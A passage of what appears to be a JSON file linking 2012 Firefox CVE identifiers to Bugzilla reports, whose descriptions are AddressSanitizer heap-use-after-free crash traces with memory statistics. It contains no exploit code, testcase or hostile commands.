src/docshell/base/nsDocShell.cpp:6246 #17 0x7f21c22935d4 in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, unsigned int) src/build/unix/stdc++compat/stdc++compat.cpp:0 #18 0x7f21c23993e6 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, unsigned int) src/uriloader/base/nsDocLoader.cpp:1351 #19 0x7f21c2396d13 in nsDocLoader::doStopDocumentLoad(nsIRequest*, unsigned int) src/uriloader/base/nsDocLoader.cpp:931 #20 0x7f21c2390316 in nsDocLoader::DocLoaderIsEmpty(bool) src/uriloader/base/nsDocLoader.cpp:820 #21 0x7f21c2397329 in nsDocLoader::ChildDoneWithOnload(nsIDocumentLoader*) src/uriloader/base/nsDocLoader.h:193 #22 0x7f21c2390356 in nsDocLoader::DocLoaderIsEmpty(bool) src/uriloader/base/nsDocLoader.cpp:823 #23 0x7f21c2394724 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) src/uriloader/base/nsDocLoader.cpp:704 #24 0x7f21c2395f7c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) src/build/unix/stdc++compat/stdc++compat.cpp:0 #25 0x7f21b9255852 in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, unsigned int) src/netwerk/base/src/nsLoadGroup.cpp:698 #26 0x7f21b924c2bc in nsLoadGroup::Cancel(unsigned int) src/netwerk/base/src/nsLoadGroup.cpp:304 #27 0x7f21c238eeef in nsDocLoader::Stop() src/uriloader/base/nsDocLoader.cpp:328 #28 0x7f21c2319965 in nsDocShell::Stop() src/docshell/base/nsDocShell.h:189 #29 0x7f21c2267db7 in nsDocShell::Stop(unsigned int) src/docshell/base/nsDocShell.cpp:4541 previously allocated by thread T0 here: #0 0x4c3ef0 in __interceptor_malloc ??:0 #1 0x7f21d2f849d2 in moz_malloc src/memory/mozalloc/mozalloc.cpp:67 #2 0x7f21c591245d in PL_DHashAllocTable src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:82 #3 0x7f21c5914bd3 in PL_DHashTableInit src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:229 #4 0x7f21c0d4e36c in nsTHashtable<nsSMILCompositor>::Init(unsigned int, mozilla::fallible_t const&) src/../../dist/include/nsTHashtable.h:414 #5 0x7f21c0d45e25 in nsTHashtable<nsSMILCompositor>::Init(unsigned int) src/../../dist/include/nsTHashtable.h:98 #6 0x7f21c0d435d1 in nsSMILAnimationController::DoSample(bool) src/content/smil/nsSMILAnimationController.cpp:413 #7 0x7f21baadbc47 in nsSMILAnimationController::Resample() src/../../../../dist/include/nsSMILAnimationController.h:66 #8 0x7f21baa4930d in nsSMILAnimationController::FlushResampleRequests() src/../../../../dist/include/nsSMILAnimationController.h:84 #9 0x7f21baa47fbe in PresShell::FlushPendingNotifications(mozFlushType) src/layout/base/nsPresShell.cpp:3846 #10 0x7f21baaea5e7 in nsRefreshDriver::Notify(nsITimer*) src/layout/base/nsRefreshDriver.cpp:378 #11 0x7f21c5ca0de6 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:476 #12 0x7f21c5ca25d8 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #13 0x7f21c5c659ce in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #14 0x7f21c5906e27 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #15 0x7f21c46e3595 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #16 0x7f21c5f12bd9 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #17 0x7f21c5f12a22 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #18 0x7f21c5f12907 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #19 0x7f21c3bad7ae in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #20 0x7f21c281e448 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 #21 0x7f21b90259b0 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3800 #22 0x7f21b902bc24 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3877 #23 0x7f21b902ecef in XRE_main src/toolkit/xre/nsAppRunner.cpp:3953 Shadow byte and word: 0x1fe432fb52ba: fd 0x1fe432fb52b8: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe432fb5298: fd fd fd fd fd fd fd fd 0x1fe432fb52a0: fd fd fd fd fd fd fd fd 0x1fe432fb52a8: fd fd fd fd fd fd fd fd 0x1fe432fb52b0: fd fd fd fd fd fd fd fd =>0x1fe432fb52b8: fd fd fd fd fd fd fd fd 0x1fe432fb52c0: fd fd fd fd fd fd fd fd 0x1fe432fb52c8: fd fd fd fd fd fd fd fd 0x1fe432fb52d0: fd fd fd fd fd fd fd fd 0x1fe432fb52d8: fd fd fd fd fd fd fd fd Stats: 220M malloced (219M for red zones) by 289499 calls Stats: 41M realloced by 14348 calls Stats: 192M freed by 181706 calls Stats: 57M really freed by 116880 calls Stats: 412M (105547 full pages) mmaped in 103 calls mmaps by size class: 8:196596; 9:40955; 10:16380; 11:14329; 12:2048; 13:1536; 14:1280; 15:256; 16:320; 17:1248; 18:160; 19:40; 20:16; mallocs by size class: 8:205900; 9:44146; 10:15477; 11:16402; 12:2266; 13:1677; 14:1399; 15:305; 16:403; 17:1293; 18:173; 19:41; 20:17; frees by size class: 8:114002; 9:35563; 10:12435; 11:13502; 12:1490; 13:1439; 14:1233; 15:266; 16:306; 17:1281; 18:136; 19:39; 20:14; rfrees by size class: 8:78488; 9:19256; 10:8038; 11:9093; 12:676; 13:448; 14:316; 15:147; 16:183; 17:201; 18:28; 19:5; 20:1; Stats: malloc large: 1524 small slow: 1617 ==10320== ABORTING"
      }
    ],
    "CVE-2012-4182": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=788950",
        "title": "Heap-use-after-free in nsTextEditRules::WillInsert",
        "description": "Reproduces on trunk, testcase coming. ================================================================= ==8725== ERROR: AddressSanitizer heap-use-after-free on address 0x7fc077a478c8 at pc 0x7fc0968060e3 bp 0x7fffd39b4db0 sp 0x7fffd39b4da8 READ of size 8 at 0x7fc077a478c8 thread T0 #0 0x7fc0968060e2 in nsCOMPtr_base::assign_assuming_AddRef(nsISupports*) src/../../../dist/include/nsCOMPtr.h:435 #1 0x7fc0a2fbef23 in nsCOMPtr_base::assign_with_AddRef(nsISupports*) src/objdir-ff-asan-sym/xpcom/build/nsCOMPtr.cpp:49 #2 0x7fc09833dd72 in nsCOMPtr<nsIDOMNode>::operator=(nsIDOMNode*) src/../../../dist/include/nsCOMPtr.h:622 #3 0x7fc09c964e46 in nsTextEditRules::WillInsert(nsISelection*, bool*) src/editor/libeditor/text/nsTextEditRules.cpp:327 #4 0x7fc09d002775 in nsHTMLEditRules::WillInsert(nsISelection*, bool*) src/editor/libeditor/html/nsHTMLEditRules.cpp:1187 #5 0x7fc09cfb5e12 in nsHTMLEditRules::WillDoAction(mozilla::Selection*, nsRulesInfo*, bool*, bool*) src/editor/libeditor/html/nsHTMLEditRules.cpp:618 #6 0x7fc09ce3358b in nsHTMLEditor::DoInsertHTMLWithContext(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, nsIDOMDocument*, nsIDOMNode*, int, bool, bool) src/editor/libeditor/html/nsHTMLDataTransfer.cpp:391 #7 0x7fc09ce2eb7e in nsHTMLEditor::InsertHTMLWithContext(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, nsIDOMDocument*, nsIDOMNode*, int, bool) src/editor/libeditor/html/nsHTMLDataTransfer.cpp:229 #8 0x7fc09ce2e42c in nsHTMLEditor::InsertHTML(nsAString_internal const&) src/editor/libeditor/html/nsHTMLDataTransfer.cpp:214 #9 0x7fc09ce2e4ee in non-virtual thunk to nsHTMLEditor::InsertHTML(nsAString_internal const&) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #10 0x7fc0a04c52d9 in nsInsertHTMLCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/editor/composer/src/nsComposerCommands.cpp:1335 #11 0x7fc09fd13f91 in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:175 #12 0x7fc09fce7262 in nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) src/embedding/components/commandhandler/src/nsBaseCommandController.cpp:153 #13 0x7fc09fce7536 in non-virtual thunk to nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #14 0x7fc09fcfdb4f in nsCommandManager::DoCommand(char const*, nsICommandParams*, nsIDOMWindow*) src/embedding/components/commandhandler/src/nsCommandManager.cpp:234 #15 0x7fc09b2a7418 in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) src/content/html/document/src/nsHTMLDocument.cpp:3232 #16 0x7fc09b2a8d6d in non-virtual thunk to nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #17 0x7fc0a345e807 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #18 0x7fc09e8bae7e in CallMethodHelper::Invoke() src/js/xpconnect/src/XPCWrappedNative.cpp:3105 #19 0x7fc09e91d995 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1470 #20 0x7fc0a9a40051 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:372 #21 0x7fc0a99cd281 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2405 #22 0x7fc0a99342c2 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:301 #23 0x7fc0a9a4d386 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:486 #24 0x7fc0a9a4f33e in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:523 #25 0x7fc0a91a14b4 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5702 #26 0x7fc09ba3f85d in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1499 #27 0x7fc09bbef6cf in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9590 #28 0x7fc09bba7049 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9851 #29 0x7fc09bbed72a in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10118 #30 0x7fc0a33a0af2 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #31 0x7fc0a33a23a8 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #32 0x7fc0a336578e in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #33 0x7fc0a3006b67 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #34 0x7fc0a1dc3625 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #35 0x7fc0a3610389 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #36 0x7fc0a36101d2 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #37 0x7fc0a36100b7 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #38 0x7fc0a12884ce in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #39 0x7fc09fee89b8 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 #40 0x7fc0966e81a0 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3835 #41 0x7fc0966ee414 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3912 #42 0x7fc0966f14de in XRE_main src/toolkit/xre/nsAppRunner.cpp:3988 #43 0x40c5bb in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #44 0x409e1f in main src/browser/app/nsBrowserApp.cpp:279 #45 0x7fc0b322bc4d in ?? ??:0 0x7fc077a478c8 is located 72 bytes inside of 1096-byte region [0x7fc077a47880,0x7fc077a47cc8) freed by thread T0 here: #0 0x4c3e30 in free ??:0 #1 0x7fc0b00c9572 in moz_free src/memory/mozalloc/mozalloc.cpp:51 #2 0x7fc09cf911c5 in operator delete(void*) src/../../../dist/include/mozilla/mozalloc.h:224 #3 0x7fc09c94e627 in nsTextEditRules::Release() src/editor/libeditor/text/nsTextEditRules.cpp:93 #4 0x7fc09cf918d3 in nsHTMLEditRules::Release() src/editor/libeditor/html/nsHTMLEditRules.cpp:220 #5 0x7fc096806070 in nsCOMPtr_base::assign_assuming_AddRef(nsISupports*) src/../../dist/include/nsCOMPtr.h:440 #6 0x7fc0a2fbef23 in nsCOMPtr_base::assign_with_AddRef(nsISupports*) src/objdir-ff-asan-sym/xpcom/build/nsCOMPtr.cpp:49 #7 0x7fc09c917a42 in nsCOMPtr<nsIEditRules>::operator=(nsIEditRules*) src/../../../dist/include/nsCOMPtr.h:622 #8 0x7fc09cea5c29 in nsHTMLEditor::InitRules() src/editor/libeditor/html/nsHTMLEditor.cpp:488 #9 0x7fc09c91a35f in nsPlaintextEditor::EndEditorInit() src/editor/libeditor/text/nsPlaintextEditor.cpp:200 #10 0x7fc09c94ba3d in ~nsAutoEditInitRulesTrigger src/editor/libeditor/text/nsTextEditUtils.cpp:94 #11 0x7fc09cea0e60 in nsHTMLEditor::Init(nsIDOMDocument*, nsIContent*, nsISelectionController*, unsigned int) src/editor/libeditor/html/nsHTMLEditor.cpp:289 #12 0x7fc0a04f6b0e in nsEditingSession::SetupEditorOnWindow(nsIDOMWindow*) src/editor/composer/src/nsEditingSession.cpp:460 #13 0x7fc0a04ec567 in nsEditingSession::MakeWindowEditable(nsIDOMWindow*, char const*, bool, bool, bool) src/editor/composer/src/nsEditingSession.cpp:173 #14 0x7fc09b277320 in nsHTMLDocument::EditingStateChanged() src/content/html/document/src/nsHTMLDocument.cpp:2693 #15 0x7fc09b274859 in nsHTMLDocument::BeginLoad() src/content/html/document/src/nsHTMLDocument.cpp:880 #16 0x7fc09cd0ac82 in nsHtml5TreeOpExecutor::WillBuildModel(nsDTDMode) src/parser/html/nsHtml5TreeOpExecutor.cpp:116 #17 0x7fc09cafcd0b in nsHtml5Parser::Parse(nsAString_internal const&, void*, nsACString_internal const&, bool, nsDTDMode) src/parser/html/nsHtml5Parser.cpp:231 #18 0x7fc09b28eb20 in nsHTMLDocument::WriteCommon(JSContext*, nsAString_internal const&, bool) src/content/html/document/src/nsHTMLDocument.cpp:1736 #19 0x7fc09b28fa95 in nsHTMLDocument::Write(nsAString_internal const&, JSContext*) src/content/html/document/src/nsHTMLDocument.cpp:1749 #20 0x7fc09eb0f571 in nsIDOMHTMLDocument_Write(JSContext*, unsigned int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:13713 #21 0x7fc0a9a40051 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:372 #22 0x7fc0a92d143c in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #23 0x7fc0a9a45a0b in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:388 #24 0x7fc0a9eb7877 in js::IndirectProxyHandler::call(JSContext*, JSObject*, unsigned int, JS::Value*) src/js/src/jsproxy.cpp:451 #25 0x7fc0aa6d01c0 in js::DirectWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) src/js/src/jswrapper.cpp:316 #26 0x7fc0aa6e1385 in js::CrossCompartmentWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) src/js/src/jswrapper.cpp:648 #27 0x7fc0aa6e1a54 in non-virtual thunk to js::CrossCompartmentWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) ??:0 #28 0x7fc0a9f428bd in js::Proxy::call(JSContext*, JSObject*, unsigned int, JS::Value*) src/js/src/jsproxy.cpp:2457 #29 0x7fc0a9f5cbcd in proxy_Call(JSContext*, unsigned int, JS::Value*) src/js/src/jsproxy.cpp:2990 previously allocated by thread T0 here: #0 0x4c3ef0 in __interceptor_malloc ??:0 #1 0x7fc0b00c96c6 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 #2 0x7fc09cea5c0a in operator new(unsigned long) src/../../../dist/include/mozilla/mozalloc.h:200 #3 0x7fc09c91a35f in nsPlaintextEditor::EndEditorInit() src/editor/libeditor/text/nsPlaintextEditor.cpp:200 #4 0x7fc09c94ba3d in ~nsAutoEditInitRulesTrigger src/editor/libeditor/text/nsTextEditUtils.cpp:94 #5 0x7fc09cea0e60 in nsHTMLEditor::Init(nsIDOMDocument*, nsIContent*, nsISelectionController*, unsigned int) src/editor/libeditor/html/nsHTMLEditor.cpp:289 #6 0x7fc0a04f6b0e in nsEditingSession::SetupEditorOnWindow(nsIDOMWindow*) src/editor/composer/src/nsEditingSession.cpp:460 #7 0x7fc0a04ec567 in nsEditingSession::MakeWindowEditable(nsIDOMWindow*, char const*, bool, bool, bool) src/editor/composer/src/nsEditingSession.cpp:173 #8 0x7fc09b277320 in nsHTMLDocument::EditingStateChanged() src/content/html/document/src/nsHTMLDocument.cpp:2693 #9 0x7fc09b29ad34 in nsHTMLDocument::MaybeEditingStateChanged() src/content/html/document/src/nsHTMLDocument.cpp:2339 #10 0x7fc09b29b4e5 in nsHTMLDocument::EndUpdate(unsigned int) src/content/html/document/src/nsHTMLDocument.cpp:2352 #11 0x7fc09cd0c35e in nsHtml5TreeOpExecutor::EndDocUpdate() src/parser/html/nsHtml5TreeOpExecutor.h:248 #12 0x7fc09cd0b9a4 in nsHtml5TreeOpExecutor::DidBuildModel(bool) src/parser/html/nsHtml5TreeOpExecutor.cpp:131 #13 0x7fc09ccf736a in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) src/parser/html/nsHtml5TreeOperation.cpp:627 #14 0x7fc09cd0fd9a in nsHtml5TreeOpExecutor::RunFlushLoop() src/parser/html/nsHtml5TreeOpExecutor.cpp:564 #15 0x7fc09cd4a905 in nsHtml5ExecutorFlusher::Run() src/parser/html/nsHtml5StreamParser.cpp:127 #16 0x7fc0a336578e in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #17 0x7fc0a3006b67 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #18 0x7fc0a1dc3625 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #19 0x7fc0a3610389 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #20 0x7fc0a36101d2 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #21 0x7fc0a36100b7 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #22 0x7fc0a12884ce in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #23 0x7fc09fee89b8 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 #24 0x7fc0966e81a1 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3835 Shadow byte and word: 0x1ff80ef48f19: fd 0x1ff80ef48f18: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff80ef48ef8: fa fa fa fa fa fa fa fa 0x1ff80ef48f00: fa fa fa fa fa fa fa fa 0x1ff80ef48f08: fa fa fa fa fa fa fa fa 0x1ff80ef48f10: fd fd fd fd fd fd fd fd =>0x1ff80ef48f18: fd fd fd fd fd fd fd fd 0x1ff80ef48f20: fd fd fd fd fd fd fd fd 0x1ff80ef48f28: fd fd fd fd fd fd fd fd 0x1ff80ef48f30: fd fd fd fd fd fd fd fd 0x1ff80ef48f38: fd fd fd fd fd fd fd fd Stats: 228M malloced (246M for red zones) by 405498 calls Stats: 43M realloced by 15549 calls Stats: 200M freed by 193168 calls Stats: 64M really freed by 120477 calls Stats: 432M (110668 full pages) mmaped in 108 calls mmaps by size class: 8:245745; 9:40955; 10:16380; 11:16376; 12:2048; 13:1536; 14:1280; 15:256; 16:320; 17:1280; 18:144; 19:40; 20:20; mallocs by size class: 8:317776; 9:46531; 10:16128; 11:17241; 12:2334; 13:1738; 14:1479; 15:332; 16:400; 17:1309; 18:172; 19:41; 20:17; frees by size class: 8:121716; 9:37588; 10:13105; 11:14230; 12:1542; 13:1565; 14:1305; 15:291; 16:328; 17:1296; 18:150; 19:38; 20:14; rfrees by size class: 8:80367; 9:20243; 10:8280; 11:9424; 12:628; 13:487; 14:388; 15:151; 16:188; 17:287; 18:28; 19:5; 20:1; Stats: malloc large: 1539 small slow: 1896 ==8725== ABORTING"
      }
    ],
    "CVE-2012-4183": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=786895",
        "title": "Heap-use-after-free in DOMSVGTests::GetRequiredFeatures",
        "description": "Reproduces on trunk. Don't have reliable testcase, but this is hitting every now and then. I got it once under a fully symbolized build that might give an idea of the problem. As i get the reliable testcase, i will attach it soon. This hits in both DOMSVGTests::GetRequiredFeatures and DOMSVGTests::GetRequiredExtensions. ================================================================= ==1718== ERROR: AddressSanitizer heap-use-after-free on address 0x7f6583c87f88 at pc 0x7f65b68c2506 bp 0x7fff5fd7bf90 sp 0x7fff5fd7bf88 READ of size 8 at 0x7f6583c87f88 thread T0 #0 0x7f65b68c2505 in nsCycleCollectingAutoRefCnt::incr(void*) src/../../../dist/include/nsISupportsImpl.h:108 #1 0x7f65bcddcdec in mozilla::DOMSVGStringList::AddRef() src/content/svg/content/src/DOMSVGStringList.cpp:21 #2 0x7f65bcde89d6 in nsRefPtr src/../../../../dist/include/nsAutoPtr.h:898 #3 0x7f65bcddea07 in nsRefPtr src/../../../../dist/include/nsAutoPtr.h:899 #4 0x7f65bcdde502 in mozilla::DOMSVGStringList::GetDOMWrapper(mozilla::SVGStringList*, nsSVGElement*, bool, unsigned char) src/content/svg/content/src/DOMSVGStringList.cpp:43 #5 0x7f65bcdeb3d1 in DOMSVGTests::GetRequiredFeatures(nsIDOMSVGStringList**) src/content/svg/content/src/DOMSVGTests.cpp:33 #6 0x7f65c25d50e7 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #7 0x7f65bda32bde in CallMethodHelper::Invoke() src/js/xpconnect/src/XPCWrappedNative.cpp:3105 #8 0x7f65bda99a67 in XPCWrappedNative::GetAttribute(XPCCallContext&) src/js/xpconnect/src/xpcprivate.h:2817 #9 0x7f65bda98e8c in XPC_WN_GetterSetter(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1518 #10 0x7f65c8ba6501 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:372 #11 0x7f65c843d6dc in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #12 0x7f65c8babebb in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:388 #13 0x7f65c8bb2910 in js::InvokeGetterOrSetter(JSContext*, JSObject*, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:461 #14 0x7f65c8eb4372 in js::Shape::get(JSContext*, JS::Handle<JSObject*>, JSObject*, JSObject*, JS::MutableHandle<JS::Value>) src/js/src/jsscopeinlines.h:296 #15 0x7f65c8e56c4e in js_NativeGetInline(JSContext*, JS::Handle<JSObject*>, JSObject*, JSObject*, js::Shape*, unsigned int, JS::Value*) src/js/src/jsobj.cpp:4461 #16 0x7f65c82bed14 in JSObject::getGeneric(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<long>, JS::MutableHandle<JS::Value>) src/js/src/jsobjinlines.h:173 #17 0x7f65c828f65b in JSObject::getProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, js::PropertyName*, JS::MutableHandle<JS::Value>) src/js/src/jsobjinlines.h:184 #18 0x7f65c8b2cd71 in js::GetObjectElementOperation(JSContext*, JSOp, JS::Handle<JSObject*>, JS::Value const&, JS::MutableHandle<JS::Value>) src/js/src/jsinterpinlines.h:713 #19 0x7f65c8a9a772 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:301 #20 0x7f65c8bb3836 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:486 #21 0x7f65c8bb57ee in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:523 #22 0x7f65c830d5f4 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5673 #23 0x7f65baba9ffd in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1499 #24 0x7f65bad59e4f in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9590 #25 0x7f65bad117c9 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9851 #26 0x7f65bad57eaa in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10118 #27 0x7f65c25173e2 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #28 0x7f65c2518c98 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #29 0x7f65c24dc08e in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #30 0x7f65c217d4f7 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #31 0x7f65c0f57df5 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #32 0x7f65c2786c69 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #33 0x7f65c2786ab2 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #34 0x7f65c2786997 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #35 0x7f65c04213be in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #36 0x7f65bf085608 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 #37 0x7f65b5863ae0 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3835 #38 0x7f65b5869d54 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3912 #39 0x7f65b586ce1e in XRE_main src/toolkit/xre/nsAppRunner.cpp:3988 #40 0x40c5bb in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #41 0x409e1f in main src/browser/app/nsBrowserApp.cpp:279 #42 0x7f65d2368c4d in ?? ??:0 0x7f6583c87f88 is located 8 bytes inside of 32-byte region [0x7f6583c87f80,0x7f6583c87fa0) freed by thread T0 here: #0 0x4c3e30 in free ??:0 #1 0x7f65cf206572 in moz_free src/memory/mozalloc/mozalloc.cpp:51 #2 0x7f65bcddd248 in operator delete(void*) src/../../../../dist/include/mozilla/mozalloc.h:224 #3 0x7f65bd8eadc5 in _ZL17DoDeferredReleaseIP11nsISupportsEvR8nsTArrayIT_24nsTArrayDefaultAllocatorE src/js/xpconnect/src/XPCJSRuntime.cpp:564 #4 0x7f65bd8ea578 in XPCJSRuntime::GCCallback(JSRuntime*, JSGCStatus) src/js/xpconnect/src/XPCJSRuntime.cpp:718 #5 0x7f65c88b7b0e in Collect(JSRuntime*, bool, long, js::JSGCInvocationKind, js::gcreason::Reason) src/js/src/jsgc.cpp:4505 #6 0x7f65c88b83b6 in js::GCFinalSlice(JSRuntime*, js::JSGCInvocationKind, js::gcreason::Reason) src/js/src/jsgc.cpp:4544 #7 0x7f65c88049e8 in js::FinishIncrementalGC(JSRuntime*, 